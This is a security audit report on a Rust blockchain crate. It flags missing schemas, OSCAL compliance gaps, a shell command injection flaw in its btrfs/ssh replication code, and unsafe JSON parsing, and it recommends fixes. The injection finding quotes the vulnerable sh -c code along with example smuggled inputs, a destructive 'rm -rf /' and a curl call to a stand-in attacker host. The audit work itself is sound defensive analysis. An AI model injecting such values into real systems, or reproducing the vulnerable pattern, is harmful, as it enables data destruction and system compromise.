| Item | Type | file:line | Has .proto? | Gap |
| :--- | :--- | :--- | :--- | :--- |
| `BlockEvent` | Struct | `crates/op-blockchain/src/footprint.rs:10` | No | Data contract represents an authoritative blockchain ledger record using unstructured, unversioned Rust structs. Uses dynamic `simd_json::OwnedValue` for payload. |
| `BlockEvent` | Struct | `crates/op-blockchain/src/streaming_blockchain.rs:24` | No | Duplicate representation of ledger blocks. Violates Don't Repeat Yourself (DRY) and schema-as-code patterns. |
| `PluginFootprint` | Struct | `crates/op-blockchain/src/footprint.rs:52` | No | Hand-rolled struct mapping system audit metrics. Employs untyped dynamic JSON and vector embeddings without proto safety. |
| `PluginFootprint` | Struct | `crates/op-blockchain/src/plugin_footprint.rs:11` | No | Secondary implementation of system state footprints with hand-rolled SHA-256 hash formatting. No versioned Protobuf representation. |
| `RetentionPolicy` | Struct | `crates/op-blockchain/src/retention.rs:10` | No | Policy schema mapped purely via Serde deserialize. Gaps in cross-language policy mapping. |
| `SnapshotInterval` | Enum | `crates/op-blockchain/src/snapshot.rs:9` | No | Local enumeration parsing unversioned env variables without standardized configuration schemas. |

---

### OSCAL Compliance Audit

| Control Area | Implemented at file:line | OSCAL Artifact | Gap |
| :--- | :--- | :--- | :--- |
| **AU-10 Non-repudiation**<br>*(Cryptographic Ledger Audit Trail)* | `crates/op-blockchain/src/blockchain.rs:141`<br>`crates/op-blockchain/src/streaming_blockchain.rs:252` | Missing | Timing blocks are written as SHA-256 validated trails to BTRFS subvolumes, but no OSCAL Component Definition maps this capability to formal AU-10 or AU-12 controls. |
| **CP-9 Information System Backup**<br>*(Local Subvolume Snapshots)* | `crates/op-blockchain/src/blockchain.rs:164`<br>`crates/op-blockchain/src/streaming_blockchain.rs:320` | Missing | Disaster recovery subvolumes are snapshotted automatically. Lack of OSCAL System Security Plan (SSP) mapping prevents compliance verification of state retention. |
| **CP-9 Information System Backup**<br>*(Remote Ledger Replication)* | `crates/op-blockchain/src/blockchain.rs:222`<br>`crates/op-blockchain/src/streaming_blockchain.rs:360`<br>`crates/op-blockchain/src/streaming_blockchain.rs:381` | Missing | Remote streaming of timing/vector state using `btrfs send` to external endpoints is not registered as a CP-9/CP-10 transmission mechanism in machine-readable OSCAL controls. |

---

### Critical Gaps and Vulnerabilities

#### 1. CRITICAL: Shell Command Injection via Unsanitized Shell Interpolation
* **Location:** 
  * `crates/op-blockchain/src/blockchain.rs:228`
  * `crates/op-blockchain/src/streaming_blockchain.rs:369`
  * `crates/op-blockchain/src/streaming_blockchain.rs:400`
* **Impact:** Remote Code Execution / Local Privilege Escalation.
* **Analysis:** 
  The codebase directly interpolates potentially untrusted parameters (`remote_path`, `remote`, and `replicas`) into a shell string formatted for `sh -c` or `bash -c`:
  ```rust
  // crates/op-blockchain/src/blockchain.rs:228
  let output = Command::new("sh")
      .arg("-c")
      .arg(format!(
          "btrfs send {} | ssh {} 'btrfs receive {}'",
          snapshot_path.display(),
          remote_path,
          remote_path
      ))
  ```
  If `remote_path` or `remote` is configured or influenced by external inputs (such as DBus interface payloads, configuration files, or network metadata), an attacker could inject shell metacharacters (e.g., `; rm -rf / ;` or `$(curl attacker.com)`). Because btrfs operations typically run with root/sudo administrative privileges, this vulnerability leads directly to system-wide compromise.

---

### Major Gaps and Technical Debt

#### 2. MAJOR: Unstructured Payload & Schema-as-Code Violations
* **Location:** 
  * `crates/op-blockchain/src/footprint.rs:14`
  * `crates/op-blockchain/src/footprint.rs:58`
  * `crates/op-blockchain/src/plugin_footprint.rs:18`
* **Impact:** Long-term ledger corruption, lack of cross-language type safety, and backward-compatibility breakages on upgrade.
* **Analysis:** 
  The blockchain authoritative ledger records (`BlockEvent` and `PluginFootprint`) rely on `simd_json::OwnedValue` to store dynamic, unstructured payload maps. This bypasses structured schema boundaries. Ledgers must be deterministic and structurally stable. Any update to the Rust structs risks introducing data-parsing failures when reading legacy ledger entries written to disk.

#### 3. MAJOR: Use of Unsafe Deserialization on Unvalidated Input
* **Location:** 
  * `crates/op-blockchain/src/btrfs_numa_integration.rs:149`
  * `crates/op-blockchain/src/blockchain.rs:198`
  * `crates/op-blockchain/src/streaming_blockchain.rs:222`
* **Impact:** Undefined behavior, memory corruption, and crash vectors from malformed ledger state.
* **Analysis:** 
  The codebase reads state JSON files directly from disk and deserializes them using `simd_json::from_str` wrapped in an `unsafe` block:
  ```rust
  let mut data = tokio::fs::read_to_string(&block_file).await?;
  let block_data: simd_json::OwnedValue = unsafe { simd_json::from_str(&mut data)? };
  ```
  `simd_json`'s unsafe parsing performs destructive in-place string modification. It assumes string memory alignment and exact structure rules. If the JSON structure on disk is malformed, truncated, or tampered with by a compromised system daemon, executing this unsafe block can trigger out-of-bounds reads/writes or memory safety violations.

---

### Recommendations

1. **Resolve Command Injection (Critical):**
   * Do not invoke a shell shell interpreter (`sh -c` or `bash -c`) with formatted string inputs.
   * Rewrite the replication command to execute separate child processes using safe argument vectors. Pipe standard output of the first command directly to standard input of the second:
   ```rust
   let mut btrfs_child = tokio::process::Command::new("btrfs")
       .args(["send"])
       .arg(&snapshot_path)
       .stdout(std::process::Stdio::piped())
       .spawn()?;

   let ssh_child = tokio::process::Command::new("ssh")
       .arg(remote)
       .args(["btrfs", "receive", "/var/lib/blockchain/vectors/"])
       .stdin(btrfs_child.stdout.take().unwrap())
       .output()
       .await?;
   ```

2. **Transition to Protocol Buffers (Schema-as-Code):**
   * Define `BlockEvent` and `PluginFootprint` in a versioned `.proto` file (e.g., `op_blockchain/v1/ledger.proto`).
   * Compile schemas using `prost` or `tonic` inside a formal `build.rs` script.
   * Eliminate all occurrences of `simd_json::OwnedValue` inside core ledger structs, replacing them with strongly typed, generated Protobuf messages with explicitly numbered fields.

3. **Secure JSON Parsing:**
   * Replace `unsafe { simd_json::from_str(&mut data)? }` with safe parsing: `simd_json::serde::from_str(&mut data)`. If absolute performance is needed, validate the string structure before introducing raw unsafe operations.

4. **Incorporate OSCAL Compliance Artifacts:**
   * Create an OSCAL component definition file (`compliance/component-definition.json`) mapping `op-blockchain` to NIST SP 800-53 security controls.
   * Map `btrfs_numa_integration.rs` and `blockchain.rs` to **AU-10 (Non-repudiation)** and **CP-9 (Information System Backup)**. Reference the cryptographic hashing and BTRFS subvolume snapshot replication implementations directly.